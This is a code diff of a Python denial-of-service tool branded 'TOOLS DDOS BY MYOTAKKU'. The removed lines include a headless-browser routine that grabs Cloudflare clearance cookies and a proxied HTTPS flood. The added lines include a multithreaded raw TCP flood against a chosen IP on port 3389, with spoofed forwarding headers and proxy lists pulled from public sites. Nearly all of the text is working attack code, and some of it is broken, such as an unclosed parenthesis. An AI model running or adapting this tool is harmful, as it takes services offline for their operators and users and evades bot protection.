@@ -54,36 +54,6 @@ time.sleep(2)
 print("[0] Berhasil Login Menggunakan Akun OTAKKUTeams")
 time.sleep(2)
 
-def get_cookie(url):
-    global useragent, cookieJAR, cookie
-    options = webdriver.ChromeOptions()
-    arguments = [
-    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
-    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
-    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
-    ]
-    for argument in arguments:
-        options.add_argument(argument)
-    driver = webdriver.Chrome(options=options)
-    driver.implicitly_wait(3)
-    driver.get(url)
-    for _ in range(60):
-        cookies = driver.get_cookies()
-        tryy = 0
-        for i in cookies:
-            if i['name'] == 'cf_clearance':
-                cookieJAR = driver.get_cookies()[tryy]
-                useragent = driver.execute_script("return navigator.userAgent")
-                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
-                driver.quit()
-                return True
-            else:
-                tryy += 1
-                pass
-        time.sleep(1)
-    driver.quit()
-    return False
-
 useragents = [
      'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
      'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
@@ -1794,26 +1764,6 @@ acceptall = [
     'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n'
 ]
 proxyResources = [
-    'https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=10000&country=all',
-    'https://www.proxy-list.download/api/v1/get?type=https',
-    'https://spys.me/proxy.txt',
-    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
-]
-
-socksFile= "proxy.txt"
-#GET SOCKS
-def socksCrawler():
-    global socksFile, socksResources
-    f = open(socksFile,'wb')
-    for url in proxyResources:
-        try:
-            f.write(requests.get(url).content)
-        except:
-            pass
-    f.close()
-    
-    
-    proxyResources = [
     'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
     'https://www.proxy-list.download/api/v1/get?type=socks5',
     'https://www.proxyscan.io/download?type=socks5',
@@ -1822,7 +1772,7 @@ def socksCrawler():
 
 socksFile= "socks5.txt"
 #GET SOCKS
-def socksCrawle():
+def socksCrawler():
     global socksFile, socksResources
     f = open(socksFile,'wb')
     for url in proxyResources:
@@ -2429,9 +2379,11 @@ print("")
 print("[+] Tools V4 Created By MYOTAKKU")
 print("[-] TOOLS DDOS BY MYOTAKKU GANTENG SEJAGAT RAYA")
 print("------------------------------------------------")
-url = str(input("URL:"))
-threads = int(input("THREADS:"))
-t = int(input("TIMES:"))
+ip = str(input("IP:")
+port = int("3389")
+method = str("TCP")
+times = int("50000")
+threads = int("500")
 time.sleep(5)
 print("[0] Checking IP ..........")
 print("Attack Send TO " + ip)
@@ -2449,45 +2401,158 @@ def spoofer():
     
 def get_proxies():
     global proxies
-    if not os.path.exists("proxy.txt"):
+    if not os.path.exists("./http.txt"):
         stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+" You Need Proxy File ( ./http.txt )\n")
         return False
-    proxy = open("proxy.txt", 'r').read().split('\n')
-    SOCKS5 = open("socks5.txt", 'r').read().split('\n')
+    proxies = open("./http.txt", 'r').read().split('\n')
     return True
     
 
-def LaunchSKY(url):
-    socksCrawler()
-    socksCrawle()
-    proxy = random.choice(proxies).strip().split(":")
-    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
-    req += "Cache-Control: no-cache\r\n"
-    req += "User-Agent: " + random.choice(useragents) + "\r\n"
-    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
-    req += "Sec-Fetch-Site: same-origin\r\n"
-    req += "Sec-GPC: 1\r\n"
-    req += "Sec-Fetch-Mode: navigate\r\n"
-    req += "Sec-Fetch-Dest: document\r\n"
-    req += "Upgrade-Insecure-Requests: 1\r\n"
-    req += "Connection: Keep-Alive\r\n\r\n"
+def Headers(method):
+    header = "UDP"
+    if method == "UDP" or method == "TCP" or method == "HTTP":
+        get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
+        post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
+        get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
+        referer = "Referer: " + random.choice(referers) + ip + "\r\n"
+        connection = "Connection: Keep-Alive\r\n" + "\r\n"
+        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
+        socks = "proxies: " + random.choice(proxies) + "\r\n"
+        length = "Content-Length: 0\r\n"
+        forward = "X-Forwarded-For: 1\r\n"
+        forwards = "Client-IP: " + ip + "\r\n"
+        accept = random.choice(acceptall) + "\r\n"
+        mozila = "User-Agent: " + random.choice(accept) + "\r\n"
+        connection += "Cache-Control: max-age=0\r\n"
+        connection += "pragma : no-cache\r\n"
+        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
+        header = post_host + socks + get_host + referer + mozila + forward + content + connection + length + "\r\n\r\n"
+        randomip = str(random.randint(1, 255)) + "." + str(random.randint(
+            0, 255)) + "." + str(random.randint(0, 255)) + "." + str(
+                random.randint(0, 255)) + "\r\n"
+        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+        request = post_host + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
+    return header
+
+def ddos():
+    get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
+    post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
+    get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
+    referer = "Referer: " + random.choice(referers) + ip + "\r\n"
+    connection = "Connection: Keep-Alive\r\n" + "\r\n"
+    proxies = open("proxies.txt", 'r').read().split('\n')
+    content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
+    socks = "proxies: " + random.choice(proxies) + "\r\n"
+    length = "Content-Length: 0\r\n"
+    forward = "X-Forwarded-For: 1\r\n"
+    forwards = "Client-IP: " + ip + "\r\n"
+    accept = random.choice(acceptall) + "\r\n"
+    mozila = "User-Agent: " + random.choice(accept) + "\r\n"
+    connection += "Cache-Control: max-age=0\r\n"
+    connection += "pragma : no-cache\r\n"
+    connection += "X-Forwarded-For: " + spoofer() + "\r\n"
+    header = post_host + socks + get_host + referer + mozila + forward + content + connection + length + "\r\n\r\n"
+    randomip = str(random.randint(1, 255)) + "." + str(random.randint(
+        0, 255)) + "." + str(random.randint(0, 255)) + "." + str(
+            random.randint(0, 255)) + "\r\n"
+    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+    request = post_host + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
+    data = random._urandom(1067)
+    data1 = random._urandom(1166)
+    data2 = random._urandom(1279)
     while True:
         try:
-            s = socks.socksocket()
-            s.connect((str(urlparse(url).netloc), int(443)))
-            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            ctx = ssl.SSLContext()
-            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
-            s.send(str.encode(req))
-            try:
-                for _ in range(100):
-                    s.send(str.encode(req))
-                    s.send(str.encode(req))
-            except:
-                s.close()
-        except:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.connect((ip,port))
+            s.send(data)
+            s.send(data)
+            s.send(data)
+            s.send(data)
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.send(data)
+            s.send(data)
+            s.send(data)
+            s.send(data)
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.send(data1)
+            s.send(data1)
+            s.send(data1)
+            s.send(data1)
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.send(data1)
+            s.send(data1)
+            s.send(data1)
+            s.send(data1)
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.send(data2)
+            s.send(data2)
+            s.send(data2)
+            s.send(data2)
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.send(data2)
+            s.send(data2)
+            s.send(data2)
+            s.send(data2)
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            for x in range(6000000998989898989888909898989898):
+                s.send(data)
+                s.send(data)
+                s.send(data)
+                s.send(data)
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.send(data)
+                s.send(data)
+                s.send(data)
+                s.send(data)
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.send(data1)
+                s.send(data1)
+                s.send(data1)
+                s.send(data1)
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.send(data1)
+                s.send(data1)
+                s.send(data1)
+                s.send(data1)
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+
+            print("Attack Sent to " + ip)
+        except :
             s.close()
 
 for y in range(threads):
-    th = threading.Thread(target = LaunchSKY,args=url)
+    th = threading.Thread(target = ddos,daemon=True)
     th.start()
